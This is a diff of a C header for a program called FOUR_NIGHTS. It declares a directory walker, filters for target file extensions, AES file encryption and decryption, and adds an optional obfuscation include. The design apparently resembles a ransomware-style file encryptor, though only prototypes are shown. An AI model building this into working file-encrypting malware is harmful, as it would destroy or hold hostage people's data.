@@ -1,8 +1,9 @@
 #ifndef FOUR_NIGHTS
 #define FOUR_NIGHTS
-/*
-#include "obfuscation.h"
-*/
+
+#ifndef NO_OBFUSCATION
+  #include "obfuscation.h"
+#endif
 
 #include <openssl/aes.h>
 #include <openssl/evp.h>
@@ -24,11 +25,10 @@
 /**
   * struct tmp_bufs_s - refillable buffers for each target file
   * @filepath: path to the file from readdir
-  * @buf: buffer of BUFSIZE * 4
+  * @plaintext: buffer of BUFSIZE * 4
   * @file_offset: If buffer < file size
   * @bytes_read: bytes currently read from file.
   * @file_info: information about the target file
-  * @encrypt: Struct that stores cipher encryption info
  **/
 typedef struct tmp_bufs_s
 {
@@ -45,6 +45,8 @@ void free_tmp_bufs_struct(tmp_bufs_t tmp_bufs);
   * @root_path: string that represents the target filepath
   * @file_exts_whole_str: string that contains all target file extensions
   * @file_extensions: double pointer to a list of file extensions as strings
+  * @cipher_flag: 'e' for encrypt or 'd' for decrypt
+  * @cipher: Encryption or decryption cipher. Must be initialized
   * @tmp_bufs: file paths in a linked list
  **/
 typedef struct file_filter_s
@@ -52,7 +54,7 @@ typedef struct file_filter_s
 	char *root_path;
 	char *file_exts_whole_str;
 	char **file_extensions;
-	char cipher_flag; /* 'e' for encrypt, 'd' for decrypt */
+	char cipher_flag;
 	EVP_CIPHER_CTX *cipher;
 	tmp_bufs_t *tmp_bufs;
 } file_filter_t;
@@ -62,14 +64,20 @@ void free_file_filter_struct(file_filter_t *file_filter);
 
 /* OS functions */
 void *traverse_dir(char *filename, file_filter_t *file_filter);
-size_t read_file(const char *filepath, file_filter_t *file_filter, char *(*fxn)(char *, file_filter_t *));
+size_t read_file(const char *filepath,
+				file_filter_t *file_filter,
+				char *(*fxn)(char *, file_filter_t *));
 char *write_file(char *filepath, file_filter_t *file_filter);
 
 /* Openssl */
 EVP_CIPHER_CTX *aes_encrypt_init(EVP_CIPHER_CTX *e_ctx);
 EVP_CIPHER_CTX *aes_decrypt_init(EVP_CIPHER_CTX *d_ctx);
-unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len);
-unsigned char *aes_decrypt(EVP_CIPHER_CTX *e, unsigned char *ciphertext, int *len);
+unsigned char *aes_encrypt(EVP_CIPHER_CTX *e,
+							unsigned char *plaintext,
+							int *len);
+unsigned char *aes_decrypt(EVP_CIPHER_CTX *d,
+							unsigned char *ciphertext,
+							int *len);
 int check_padding(unsigned char *filepath, size_t size);
 
 /* DEBUGGING */
